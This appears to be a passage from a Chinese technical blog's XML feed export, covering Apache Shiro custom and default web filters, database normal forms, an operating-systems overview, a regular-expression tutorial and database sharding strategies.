部分并注册这些拦截器到 DefaultFilterChainManager；且创建相应的 url 模式与其拦截器关系链。如果使用 Spring 后续章节会介绍如果注册自定义拦截器。 如果想自定义 FilterChainResolver，可以通过实现 WebEnvironment 接口完成： 1234567public class MyIniWebEnvironment extends IniWebEnvironment &#123; @Override protected FilterChainResolver createFilterChainResolver() &#123; //在此处扩展自己的FilterChainResolver return super.createFilterChainResolver(); &#125;&#125;&amp;nbsp; FilterChain 之间的关系。如果想动态实现 url -拦截器的注册，就可以通过实现此处的 FilterChainResolver 来完成，比如： 123456789101112131415161718192021222324//1、创建 FilterChainResolverPathMatchingFilterChainResolver filterChainResolver = new PathMatchingFilterChainResolver();//2、创建 FilterChainManagerDefaultFilterChainManager filterChainManager = new DefaultFilterChainManager();//3、注册 Filterfor(DefaultFilter filter : DefaultFilter.values()) &#123; filterChainManager.addFilter( filter.name(), (Filter) ClassUtils.newInstance(filter.getFilterClass()));&#125;//4、注册 URL-Filter 的映射关系filterChainManager.addToChain(&quot;/login.jsp&quot;, &quot;authc&quot;);filterChainManager.addToChain(&quot;/unauthorized.jsp&quot;, &quot;anon&quot;);filterChainManager.addToChain(&quot;/**&quot;, &quot;authc&quot;);filterChainManager.addToChain(&quot;/**&quot;, &quot;roles&quot;, &quot;admin&quot;);//5、设置 Filter 的属性FormAuthenticationFilter authcFilter = (FormAuthenticationFilter)filterChainManager.getFilter(&quot;authc&quot;);authcFilter.setLoginUrl(&quot;/login.jsp&quot;);RolesAuthorizationFilter rolesFilter = (RolesAuthorizationFilter)filterChainManager.getFilter(&quot;roles&quot;);rolesFilter.setUnauthorizedUrl(&quot;/unauthorized.jsp&quot;);filterChainResolver.setFilterChainManager(filterChainManager);return filterChainResolver;&amp;nbsp; 此处自己去实现注册 filter，及url 模式与 filter 之间的映射关系。可以通过定制 FilterChainResolver 或 FilterChainManager 来完成诸如动态 URL 匹配的实现。 然后再 web.xml 中进行如下配置 Environment： 123&lt;context-param&gt;&lt;param-name&gt;shiroEnvironmentClass&lt;/param-name&gt; &lt;param-value&gt;com.github.zhangkaitao.shiro.chapter8.web.env.MyIniWebEnvironment&lt;/param-value&gt;&lt;/context-param&gt;&amp;nbsp; 自定义拦截器通过自定义自己的拦截器可以扩展一些功能，诸如动态 url -角色/权限访问控制的实现、根据 Subject 身份信息获取用户信息绑定到 Request（即设置通用数据）、验证码验证、在线用户信息的保存等等，因为其本质就是一个 Filter；所以 Filter 能做的它就能做。 对于 Filter 的介绍请参考《Servlet规范》中的 Filter 部分：http://www.iteye.com/blogs/subjects/Servlet-3-1。 1、扩展 OncePerRequestFilter OncePerRequestFilter 保证一次请求只调用一次 doFilterInternal，即如内部的 forward 不会再多执行一次 doFilterInternal： 1234567public class MyOncePerRequestFilter extends OncePerRequestFilter &#123; @Override protected void doFilterInternal(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException &#123; System.out.println(&quot;=========once per request filter&quot;); chain.doFilter(request, response); &#125;&#125;&amp;nbsp; 然后再 shiro.ini 配置文件中： 123456[main]myFilter1=com.github.zhangkaitao.shiro.chapter8.web.filter.MyOncePerRequestFilter\#[filters]\#myFilter1=com.github.zhangkaitao.shiro.chapter8.web.filter.MyOncePerRequestFilter[urls]/**=myFilter1&amp;nbsp; Filter 可以在 [main] 或 [filters] 部分注册，然后在 [urls] 部分配置 url 与 filter 的映射关系即可。 2、扩展 AdviceFilter AdviceFilter 提供了 AOP 的功能，其实现和 SpringMVC 中的 Interceptor 思想一样：具体可参考我的 SpringMVC 教程中的处理器拦截器部分：http://www.iteye.com/blogs/subjects/kaitao-springmvc 123456789101112131415public class MyAdviceFilter extends AdviceFilter &#123; @Override protected boolean preHandle(ServletRequest request, ServletResponse response) throws Exception &#123; System.out.println(&quot;====预处理/前置处理&quot;); return true;//返回 false 将中断后续拦截器链的执行 &#125; @Override protected void postHandle(ServletRequest request, ServletResponse response) throws Exception &#123; System.out.println(&quot;====后处理/后置返回处理&quot;); &#125; @Override public void afterCompletion(ServletRequest request, ServletResponse response, Exception exception) throws Exception &#123; System.out.println(&quot;====完成处理/后置最终处理&quot;); &#125;&#125;&amp;nbsp; preHandle：进行请求的预处理，然后根据返回值决定是否继续处理（true：继续过滤器链）；可以通过它实现权限控制； postHandle：执行完拦截器链之后正常返回后执行； afterCompletion：不管最后有没有异常，afterCompletion 都会执行，完成如清理资源功能。 然后在 shiro.ini 中进行如下配置： 12345[filters]myFilter1=com.github.zhangkaitao.shiro.chapter8.web.filter.MyOncePerRequestFiltermyFilter2=com.github.zhangkaitao.shiro.chapter8.web.filter.MyAdviceFilter[urls]/**=myFilter1,myFilter2&amp;nbsp; 该过滤器的具体使用可参考我的 SpringMVC 教程中的处理器拦截器部分。 3、PathMatchingFilter PathMatchingFilter 继承了 AdviceFilter，提供了 url 模式过滤的功能，如果需要对指定的请求进行处理，可以扩展 PathMatchingFilter： 1234567public class MyPathMatchingFilter extends PathMatchingFilter &#123; @Override protected boolean onPreHandle(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception &#123; System.out.println(&quot;url matches,config is &quot; + Arrays.toString((String[])mappedValue)); return true; &#125;&#125;&amp;nbsp; preHandle：会进行 url 模式与请求 url 进行匹配，如果匹配会调用 onPreHandle；如果没有配置 url 模式 / 没有 url 模式匹配，默认直接返回 true； onPreHandle：如果 url 模式与请求 url 匹配，那么会执行 onPreHandle，并把该拦截器配置的参数传入。默认什么不处理直接返回 true。 然后在 shiro.ini 中进行如下配置： 1234[filters]myFilter3=com.github.zhangkaitao.shiro.chapter8.web.filter.MyPathMatchingFilter[urls]/**= myFilter3[config]&amp;nbsp; /** 就是注册给 PathMatchingFilter 的 url 模式，config 就是拦截器的配置参数，多个之间逗号分隔，onPreHandle 使用 mappedValue 接收参数值。 4、扩展 AccessControlFilter AccessControlFilter 继承了 PathMatchingFilter，并扩展了了两个方法： 1234public boolean onPreHandle(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception &#123; return isAccessAllowed(request, response, mappedValue) || onAccessDenied(request, response, mappedValue);&#125;&amp;nbsp; isAccessAllowed：即是否允许访问，返回 true 表示允许；onAccessDenied：表示访问拒绝时是否自己处理，如果返回 true 表示自己不处理且继续拦截器链执行，返回 false 表示自己已经处理了（比如重定向到另一个页面）。 12345678910public class MyAccessControlFilter extends AccessControlFilter &#123; protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception &#123; System.out.println(&quot;access allowed&quot;); return true; &#125; protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception &#123; System.out.println(&quot;访问拒绝也不自己处理，继续拦截器链的执行&quot;); return true; &#125;&#125;&amp;nbsp; 然后在 shiro.ini 中进行如下配置： 5、基于表单登录拦截器 之前我们已经使用过 Shiro 内置的基于表单登录的拦截器了，此处自己做一个类似的基于表单登录的拦截器。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546public class FormLoginFilter extends PathMatchingFilter &#123; private String loginUrl = &quot;/login.jsp&quot;; private String successUrl = &quot;/&quot;; @Override protected boolean onPreHandle(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception &#123; if(SecurityUtils.getSubject().isAuthenticated()) &#123; return true;//已经登录过 &#125; HttpServletRequest req = (HttpServletRequest) request; HttpServletResponse resp = (HttpServletResponse) response; if(isLoginRequest(req)) &#123; if(&quot;post&quot;.equalsIgnoreCase(req.getMethod())) &#123;//form表单提交 boolean loginSuccess = login(req); //登录 if(loginSuccess) &#123; return redirectToSuccessUrl(req, resp); &#125; &#125; return true;//继续过滤器链 &#125; else &#123;//保存当前地址并重定向到登录界面 saveRequestAndRedirectToLogin(req, resp); return false; &#125; &#125; private boolean redirectToSuccessUrl(HttpServletRequest req, HttpServletResponse resp) throws IOException &#123; WebUtils.redirectToSavedRequest(req, resp, successUrl); return false; &#125; private void saveRequestAndRedirectToLogin(HttpServletRequest req, HttpServletResponse resp) throws IOException &#123; WebUtils.saveRequest(req); WebUtils.issueRedirect(req, resp, loginUrl); &#125; private boolean login(HttpServletRequest req) &#123; String username = req.getParameter(&quot;username&quot;); String password = req.getParameter(&quot;password&quot;); try &#123; SecurityUtils.getSubject().login(new UsernamePasswordToken(username, password)); &#125; catch (Exception e) &#123; req.setAttribute(&quot;shiroLoginFailure&quot;, e.getClass()); return false; &#125; return true; &#125; private boolean isLoginRequest(HttpServletRequest req) &#123; return pathsMatch(loginUrl, WebUtils.getPathWithinApplication(req)); &#125;&#125;&amp;nbsp; onPreHandle 主要流程： 首先判断是否已经登录过了，如果已经登录过了继续拦截器链即可； 如果没有登录，看看是否是登录请求，如果是 get 方法的登录页面请求，则继续拦截器链（到请求页面），否则如果是 get 方法的其他页面请求则保存当前请求并重定向到登录页面； 如果是 post 方法的登录页面表单提交请求，则收集用户名 / 密码登录即可，如果失败了保存错误消息到 “shiroLoginFailure” 并返回到登录页面； 如果登录成功了，且之前有保存的请求，则重定向到之前的这个请求，否则到默认的成功页面。 shiro.ini 配置 12345[filters]formLogin=com.github.zhangkaitao.shiro.chapter8.web.filter.FormLoginFilter[urls]/test.jsp=formLogin/login.jsp=formLogin&amp;nbsp; 启动服务器输入 http://localhost:8080/chapter8/test.jsp 测试时，会自动跳转到登录页面，登录成功后又会跳回到 test.jsp 页面。 此处可以通过继承 AuthenticatingFilter 实现，其提供了很多登录相关的基础代码。另外可以参考 Shiro 内嵌的 FormAuthenticationFilter 的源码，思路是一样的。 6、任意角色授权拦截器 Shiro 提供 roles 拦截器，其验证用户拥有所有角色，没有提供验证用户拥有任意角色的拦截器。 12345678910111213141516171819202122232425262728293031public class AnyRolesFilter extends AccessControlFilter &#123; private String unauthorizedUrl = &quot;/unauthorized.jsp&quot;; private String loginUrl = &quot;/login.jsp&quot;; protected boolean isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception &#123; String[] roles = (String[])mappedValue; if(roles == null) &#123; return true;//如果没有设置角色参数，默认成功 &#125; for(String role : roles) &#123; if(getSubject(request, response).hasRole(role)) &#123; return true; &#125; &#125; return false;//跳到onAccessDenied处理 &#125; @Override protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception &#123; Subject subject = getSubject(request, response); if (subject.getPrincipal() == null) &#123;//表示没有登录，重定向到登录页面 saveRequest(request); WebUtils.issueRedirect(request, response, loginUrl); &#125; else &#123; if (StringUtils.hasText(unauthorizedUrl)) &#123;//如果有未授权页面跳转过去 WebUtils.issueRedirect(request, response, unauthorizedUrl); &#125; else &#123;//否则返回401未授权状态码 WebUtils.toHttp(response).sendError(HttpServletResponse.SC_UNAUTHORIZED); &#125; &#125; return false; &#125;&#125; 流程： 首先判断用户有没有任意角色，如果没有返回 false，将到 onAccessDenied 进行处理； 如果用户没有角色，接着判断用户有没有登录，如果没有登录先重定向到登录； 如果用户没有角色且设置了未授权页面（unauthorizedUrl），那么重定向到未授权页面；否则直接返回 401 未授权错误码。 shiro.ini 配置 12345[filters]anyRoles=com.github.zhangkaitao.shiro.chapter8.web.filter.AnyRolesFilter[urls]/test.jsp=formLogin,anyRoles[admin,user]/login.jsp=formLogin&amp;nbsp; 此处可以继承 AuthorizationFilter 实现，其提供了授权相关的基础代码。另外可以参考 Shiro 内嵌的 RolesAuthorizationFilter 的源码，只是实现 hasAllRoles 逻辑。 默认拦截器Shiro 内置了很多默认的拦截器，比如身份验证、授权等相关的。默认拦截器可以参考 org.apache.shiro.web.filter.mgt.DefaultFilter 中的枚举拦截器： 默认拦截器名 拦截器类 说明（括号里的表示默认值） 身份验证相关的 authc org.apache.shiro.web.filter.authc.FormAuthenticationFilter 基于表单的拦截器；如 “/**=authc”，如果没有登录会跳到相应的登录页面登录；主要属性：usernameParam：表单提交的用户名参数名（ username）； passwordParam：表单提交的密码参数名（password）； rememberMeParam：表单提交的密码参数名（rememberMe）； loginUrl：登录页面地址（/login.jsp）；successUrl：登录成功后的默认重定向地址； failureKeyAttribute：登录失败后错误信息存储 key（shiroLoginFailure）； authcBasic org.apache.shiro.web.filter.authc.BasicHttpAuthenticationFilter Basic HTTP 身份验证拦截器，主要属性： applicationName：弹出登录框显示的信息（application）； logout org.apache.shiro.web.filter.authc.LogoutFilter 退出拦截器，主要属性：redirectUrl：退出成功后重定向的地址（/）; 示例 “/logout=logout” user org.apache.shiro.web.filter.authc.UserFilter 用户拦截器，用户已经身份验证 / 记住我登录的都可；示例 “/**=user” anon org.apache.shiro.web.filter.authc.AnonymousFilter 匿名拦截器，即不需要登录即可访问；一般用于静态资源过滤；示例 “/static/**=anon” 授权相关的 roles org.apache.shiro.web.filter.authz.RolesAuthorizationFilter 角色授权拦截器，验证用户是否拥有所有角色；主要属性： loginUrl：登录页面地址（/login.jsp）；unauthorizedUrl：未授权后重定向的地址；示例 “/admin/**=roles[admin]” perms org.apache.shiro.web.filter.authz.PermissionsAuthorizationFilter 权限授权拦截器，验证用户是否拥有所有权限；属性和 roles 一样；示例 “/user/**=perms[“user:create”]” port org.apache.shiro.web.filter.authz.PortFilter 端口拦截器，主要属性：port（80）：可以通过的端口；示例 “/test= port[80]”，如果用户访问该页面是非 80，将自动将请求端口改为 80 并重定向到该 80 端口，其他路径 / 参数等都一样 rest org.apache.shiro.web.filter.authz.HttpMethodPermissionFilter rest 风格拦截器，自动根据请求方法构建权限字符串（GET=read, POST=create,PUT=update,DELETE=delete,HEAD=read,TRACE=read,OPTIONS=read, MKCOL=create）构建权限字符串；示例 “/users=rest[user]”，会自动拼出“user:read,user:create,user:update,user:delete” 权限字符串进行权限匹配（所有都得匹配，isPermittedAll）； ssl org.apache.shiro.web.filter.authz.SslFilter SSL 拦截器，只有请求协议是 https 才能通过；否则自动跳转会 https 端口（443）；其他和 port 拦截器一样； 其他 noSessionCreation org.apache.shiro.web.filter.session.NoSessionCreationFilter 不创建会话拦截器，调用 subject.getSession(false) 不会有什么问题，但是如果 subject.getSession(true) 将抛出 DisabledSessionException 异常； 另外还提供了一个 org.apache.shiro.web.filter.authz.HostFilter，即主机拦截器，比如其提供了属性：authorizedIps：已授权的 ip 地址，deniedIps：表示拒绝的 ip 地址；不过目前还没有完全实现，不可用。 这些默认的拦截器会自动注册，可以直接在 ini 配置文件中通过 “拦截器名. 属性” 设置其属性： 1perms.unauthorizedUrl=/unauthorized 另外如果某个拦截器不想使用了可以直接通过如下配置直接禁用： 1perms.enabled=false]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>拦截器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库表设计规则]]></title>
    <url>%2F2018%2F09%2F23%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E8%AE%BE%E8%AE%A1%E8%A7%84%E5%88%99%2F</url>
    <content type="text"><![CDATA[本篇博客介绍数据库表设计应遵循的三大范式 范式 解释 第一范式 第一范式就是无重复的列 第二范式 第二范式就是非主属性非部分依赖于主关键字 第三范式 第三范式就是属性不依赖于其它非主属性]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库表设计规则</tag>
        <tag>三大范式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作系统概述]]></title>
    <url>%2F2018%2F09%2F15%2F%E6%A6%82%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[基本特征1. 并发并发是指宏观上在一段时间内能同时运行多个程序，而并行则指同一时刻能运行多个指令。 并行需要硬件支持，如多流水线、多核处理器或者分布式计算系统。 操作系统通过引入进程和线程，使得程序能够并发运行。 2. 共享共享是指系统中的资源可以被多个并发进程共同使用。 有两种共享方式：互斥共享和同时共享。 互斥共享的资源称为临界资源，例如打印机等，在同一时间只允许一个进程访问，需要用同步机制来实现对临界资源的访问。 3. 虚拟虚拟技术把一个物理实体转换为多个逻辑实体。 主要有两种虚拟技术：时分复用技术和空分复用技术。 多个进程能在同一个处理器上并发执行使用了时分复用技术，让每个进程轮流占有处理器，每次只执行一小个时间片并快速切换。 虚拟内存使用了空分复用技术，它将物理内存抽象为地址空间，每个进程都有各自的地址空间。地址空间的页被映射到物理内存，地址空间的页并不需要全部在物理内存中，当使用到一个没有在物理内存的页时，执行页面置换算法，将该页置换到内存中。 4. 异步异步指进程不是一次性执行完毕，而是走走停停，以不可知的速度向前推进。 基本功能1. 进程管理进程控制、进程同步、进程通信、死锁处理、处理机调度等。 2. 内存管理内存分配、地址映射、内存保护与共享、虚拟内存等。 3. 文件管理文件存储空间的管理、目录管理、文件读写管理和保护等。 4. 设备管理完成用户的 I/O 请求，方便用户使用各种设备，并提高设备的利用率。 主要包括缓冲管理、设备分配、设备处理、虛拟设备等。 系统调用如果一个进程在用户态需要使用内核态的功能，就进行系统调用从而陷入内核，由操作系统代为完成。 Linux 的系统调用主要有以下这些： Task Commands 进程控制 fork(); exit(); wait(); 进程通信 pipe(); shmget(); mmap(); 文件操作 open(); read(); write(); 设备操作 ioctl(); read(); write(); 信息维护 getpid(); alarm(); sleep(); 安全 chmod(); umask(); chown(); 大内核和微内核1. 大内核大内核是将操作系统功能作为一个紧密结合的整体放到内核。 由于各模块共享信息，因此有很高的性能。 2. 微内核由于操作系统不断复杂，因此将一部分操作系统功能移出内核，从而降低内核的复杂性。移出的部分根据分层的原则划分成若干服务，相互独立。 在微内核结构下，操作系统被划分成小的、定义良好的模块，只有微内核这一个模块运行在内核态，其余模块运行在用户态。 因为需要频繁地在用户态和核心态之间进行切换，所以会有一定的性能损失。 中断分类1. 外中断由 CPU 执行指令以外的事件引起，如 I/O 完成中断，表示设备输入/输出处理已经完成，处理器能够发送下一个输入/输出请求。此外还有时钟中断、控制台中断等。 2. 异常由 CPU 执行指令的内部事件引起，如非法操作码、地址越界、算术溢出等。 3. 陷入在用户程序中使用系统调用。]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>计算机操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式]]></title>
    <url>%2F2018%2F09%2F15%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[一、概述正则表达式用于文本内容的查找和替换。 正则表达式内置于其它语言或者软件产品中，它本身不是一种语言或者软件。 正则表达式在线工具 二、匹配单个字符. 可以用来匹配任何的单个字符，但是在绝大多数实现里面，不能匹配换行符； . 是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上 \ 。 正则表达式一般是区分大小写的，但是也有些实现是不区分。 正则表达式 1nam. 匹配结果 My name is Zheng. 三、匹配一组字符[ ] 定义一个字符集合； 0-9、a-z 定义了一个字符区间，区间使用 ASCII 码来确定，字符区间在 [ ] 中使用。 - 只有在 [ ] 之间才是元字符，在 [ ] 之外就是一个普通字符； ^ 在 [ ] 中是取非操作。 应用 匹配以 abc 为开头，并且最后一个字母不为数字的字符串： 正则表达式 1abc[^0-9] 匹配结果 abcd abc1 abc2 四、使用元字符匹配空白字符 元字符 说明 [\b] 回退（删除）一个字符 \f 换页符 \n 换行符 \r 回车符 \t 制表符 \v 垂直制表符 \r\n 是 Windows 中的文本行结束标签，在 Unix/Linux 则是 \n。 \r\n\r\n 可以匹配 Windows 下的空白行，因为它匹配两个连续的行尾标签，而这正是两条记录之间的空白行； 匹配特定的字符类别1. 数字元字符 元字符 说明 \d 数字字符，等价于 [0-9] \D 非数字字符，等价于 [^0-9] 2. 字母数字元字符 元字符 说明 \w 大小写字母，下划线和数字，等价于 [a-zA-Z0-9_] \W 对 \w 取非 3. 空白字符元字符 元字符 说明 \s 任何一个空白字符，等价于 [\f\n\r\t\v] \S 对 \s 取非 \x 匹配十六进制字符，\0 匹配八进制，例如 \x0A 对应 ASCII 字符 10，等价于 \n。 五、重复匹配 + 匹配 1 个或者多个字符 \ * 匹配 0 个或者多个 ? 匹配 0 个或者 1 个 应用 匹配邮箱地址。 正则表达式 1[\w.]+@\w+\.\w+ [\w.] 匹配的是字母数字或者 . ，在其后面加上 + ，表示匹配多次。在字符集合 [ ] 里，. 不是元字符； 匹配结果 abc.def@qq.com {n} 匹配 n 个字符 {m, n} 匹配 m~n 个字符 {m,} 至少匹配 m 个字符 * 和 + 都是贪婪型元字符，会匹配尽可能多的内容。在后面加 ? 可以转换为懒惰型元字符，例如 *?、+? 和 {m, n}? 。 正则表达式 1a.+c 由于 + 是贪婪型的，因此 .+ 会匹配更可能多的内容，所以会把整个 abcabcabc 文本都匹配，而不是只匹配前面的 abc 文本。用懒惰型可以实现匹配前面的。 匹配结果 abcabcabc 六、位置匹配单词边界\b 可以匹配一个单词的边界，边界是指位于 \w 和 \W 之间的位置；\B 匹配一个不是单词边界的位置。 \b 只匹配位置，不匹配字符，因此 \babc\b 匹配出来的结果为 3 个字符。 字符串边界^ 匹配整个字符串的开头，$ 匹配结尾。 ^ 元字符在字符集合中用作求非，在字符集合外用作匹配字符串的开头。 分行匹配模式（multiline）下，换行被当做字符串的边界。 应用 匹配代码中以 // 开始的注释行 正则表达式 1^\s*\/\/.*$ 匹配结果 public void fun() { &nbsp;&nbsp;&nbsp;&nbsp; // 注释 1 &nbsp;&nbsp;&nbsp;&nbsp; int a = 1; &nbsp;&nbsp;&nbsp;&nbsp; int b = 2; &nbsp;&nbsp;&nbsp;&nbsp; // 注释 2 &nbsp;&nbsp;&nbsp;&nbsp; int c = a + b; } 七、使用子表达式使用 ( ) 定义一个子表达式。子表达式的内容可以当成一个独立元素，即可以将它看成一个字符，并且使用 * 等元字符。 子表达式可以嵌套，但是嵌套层次过深会变得很难理解。 正则表达式 1(ab)&#123;2,&#125; 匹配结果 ababab | 是或元字符，它把左边和右边所有的部分都看成单独的两个部分，两个部分只要有一个匹配就行。 正则表达式 1(19|20)\d&#123;2&#125; 匹配结果 1900 2010 1020 应用 匹配 IP 地址。 IP 地址中每部分都是 0-255 的数字，用正则表达式匹配时以下情况是合法的： 一位数字 不以 0 开头的两位数字 1 开头的三位数 2 开头，第 2 位是 0-4 的三位数 25 开头，第 3 位是 0-5 的三位数 正则表达式 1((25[0-5]|(2[0-4]\d)|(1\d&#123;2&#125;)|([1-9]\d)|(\d))\.)&#123;3&#125;(25[0-5]|(2[0-4]\d)|(1\d&#123;2&#125;)|([1-9]\d)|(\d)) 匹配结果 192.168.0.1 00.00.00.00 555.555.555.555 八、回溯引用回溯引用使用 \n 来引用某个子表达式，其中 n 代表的是子表达式的序号，从 1 开始。它和子表达式匹配的内容一致，比如子表达式匹配到 abc，那么回溯引用部分也需要匹配 abc 。 应用 匹配 HTML 中合法的标题元素。 正则表达式 \1 将回溯引用子表达式 (h[1-6]) 匹配的内容，也就是说必须和子表达式匹配的内容一致。 1&lt;(h[1-6])&gt;\w*?&lt;\/\1&gt; 匹配结果 &lt;h1&gt;x&lt;/h1&gt; &lt;h2&gt;x&lt;/h2&gt; &lt;h3&gt;x&lt;/h1&gt; 替换需要用到两个正则表达式。 应用 修改电话号码格式。 文本 313-555-1234 查找正则表达式 1(\d&#123;3&#125;)(-)(\d&#123;3&#125;)(-)(\d&#123;4&#125;) 替换正则表达式 在第一个子表达式查找的结果加上 () ，然后加一个空格，在第三个和第五个字表达式查找的结果中间加上 - 进行分隔。 1($1) $3-$5 结果 (313) 555-1234 大小写转换 元字符 说明 \l 把下个字符转换为小写 \u 把下个字符转换为大写 \L 把\L 和\E 之间的字符全部转换为小写 \U 把\U 和\E 之间的字符全部转换为大写 \E 结束\L 或者\U 应用 把文本的第二个和第三个字符转换为大写。 文本 abcd 查找 1(\w)(\w&#123;2&#125;)(\w) 替换 1$1\U$2\E$3 结果 aBCd 九、前后查找前后查找规定了匹配的内容首尾应该匹配的内容，但是又不包含首尾匹配的内容。向前查找用 ?= 来定义，它规定了尾部匹配的内容，这个匹配的内容在 ?= 之后定义。所谓向前查找，就是规定了一个匹配的内容，然后以这个内容为尾部向前面查找需要匹配的内容。向后匹配用 ?&lt;= 定义（注: javaScript 不支持向后匹配, java 对其支持也不完善）。 应用 查找出邮件地址 @ 字符前面的部分。 正则表达式 1\w+(?=@) 结果 abc @qq.com 对向前和向后查找取非，只要把 = 替换成 ! 即可，比如 (?=) 替换成 (?!) 。取非操作使得匹配那些首尾不符合要求的内容。 十、嵌入条件回溯引用条件条件判断为某个子表达式是否匹配，如果匹配则需要继续匹配条件表达式后面的内容。 正则表达式 子表达式 (\() 匹配一个左括号，其后的 ? 表示匹配 0 个或者 1 个。 ?(1) 为条件，当子表达式 1 匹配时条件成立，需要执行 ) 匹配，也就是匹配右括号。 1(\()?abc(?(1)\)) 结果 (abc) abc (abc 前后查找条件条件为定义的首尾是否匹配，如果匹配，则继续执行后面的匹配。注意，首尾不包含在匹配的内容中。 正则表达式 ?(?=-) 为前向查找条件，只有在以 - 为前向查找的结尾能匹配 \d{5} ，才继续匹配 -\d{4} 。 1\d&#123;5&#125;(?(?=-)-\d&#123;4&#125;) 结果 11111 22222- 33333-4444]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库分库分表]]></title>
    <url>%2F2018%2F09%2F13%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[数据切分 关系型数据库本身比较容易成为系统瓶颈，单机存储容量、连接数、处理能力都有限。 当单表的数据量达到1000W或100G以后，由于查询维度较多，即使添加从库、优化索引，做很多操作时性能仍下降严重。此时就要考虑对其进行切分了，切分的目的就在于减少数据库的负担，缩短查询时间。 数据库分布式核心内容无非就是数据切分（Sharding），以及切分后对数据的定位、整合。 数据切分就是将数据分散存储到多个数据库中，使得单一数据库中的数据量变小，通过扩充主机的数量缓解单一数据库的性能问题，从而达到提升数据库操作性能的目的。 数据切分根据其切分类型，可以分为两种方式：垂直（纵向）切分和水平（横向）切分。 垂直（纵向）切分垂直切分常见有垂直分库和垂直分表两种。 垂直分库 垂直分库就是根据业务耦合性，将关联度低的不同表存储在不同的数据库。 做法与大系统拆分为多个小系统类似，按业务分类进行独立划分。 与”微服务治理“的做法相似，每个微服务使用单独的一个数据库。如图： 垂直分表 垂直分表是基于数据库中的”列“进行，某个表字段较多，可以新建一张扩展表，将不经常用或字段长度较大的字段拆分出去到扩展表中。 在字段很多的情况下（例如一个大表有100多个字段），通过”大表拆小表“，更便于开发与维护，也能避免跨页问题，MySQL底层是通过数据页存储的，一条记录占用空间过大会导致跨页，造成额外的性能开销。 另外数据库以行为单位将数据加载到内存中，这样表中字段长度较短且访问频率较高，内存能加载更多的数据，命中率更高，减少了磁盘IO，从而提升了数据库性能。 垂直切分的优点 解决业务系统层面的耦合，业务清晰。 与微服务的治理类似，也能对不同业务的数据进行分级管理、维护、监控、扩展等。 高并发场景下，垂直切分一定程度的提升IO、数据库连接数、单机硬件资源的瓶颈。 垂直切分的缺点 部分表无法join，只能通过接口聚合方式解决，提升了开发的复杂度 分布式事务处理复杂 依然存在单表数据量过大的问题（需要水平切分）。 水平（横向）切分 当一个应用难以再细粒度的垂直切分，或切分后数据量行数巨大，存在单库读写、存储性能瓶颈，这时候就需要进行水平切分了。 水平切分分为库内分表和分库分表，是根据表内数据内在的逻辑关系，将同一个表按不同的条件分散到多个数据库或多个表中，每个表中只包含一部分数据，从而使得单个表的数据量变小，达到分布式的效果。如图所示： 库内分表只解决了单一表数据量过大的问题，但没有将表分布到不同机器的库上，因此对于减轻MySQL数据库的压力来说，帮助不是很大，大家还是竞争同一个物理机的CPU、内存、网络IO，最好通过分库分表来解决。 水平切分的优点 不存在单库数据量过大、高并发的性能瓶颈，提升系统稳定性和负载能力。 应用端改造较小，不需要拆分业务模块。 水平切分的缺点 跨分片的事务一致性难以保证 跨库的join关联查询性能较差 数据多次扩展难度和维护量极大 数据分片规则水平切分后同一张表会出现在多个数据库/表中，每个库/表的内容不同。几种典型的数据分片规则为： 根据数值范围 某种意义上，某些系统中使用的”冷热数据分离“，将一些使用较少的历史数据迁移到其他库中，业务功能上只提供热点数据的查询，也是类似的实践。 按照时间区间或ID区间来切分。 日期：按日期将不同月甚至是日的数据分散到不同的库中； ID：将userId为1~9999的记录分到第一个库，10000~20000的分到第二个库，以此类推。 优点 单表大小可控。 天然便于水平扩展，后期如果想对整个分片集群扩容时，只需要添加节点即可，无需对其他分片的数据进行迁移。 使用分片字段进行范围查找时，连续分片可快速定位分片进行快速查询，有效避免跨分片查询的问题。 缺点 热点数据成为性能瓶颈。 连续分片可能存在数据热点，例如按时间字段分片，有些分片存储最近时间段内的数据，可能会被频繁的读写，而有些分片存储的历史数据，则很少被查询。 根据数值取模一般采用hash取模mod的切分方式，例如：将 Customer 表根据 cusno 字段切分到4个库中，余数为0的放到第一个库，余数为1的放到第二个库，以此类推。这样同一个用户的数据会分散到同一个库中，如果查询条件带有cusno字段，则可明确定位到相应库去查询。 优点 数据分片相对比较均匀，不容易出现热点和并发访问的瓶颈。 缺点 后期分片集群扩容时，需要迁移旧的数据（使用一致性hash算法能较好的避免这个问题）。 容易面临跨分片查询的复杂问题。比如上例中，如果频繁用到的查询条件中不带cusno时，将会导致无法定位数据库，从而需要同时向4个库发起查询，再在内存中合并数据，取最小集返回给应用，分库反而成为拖累。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>分表</tag>
        <tag>分库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP]]></title>
    <url>%2F2018%2F09%2F13%2FHTTP%2F</url>
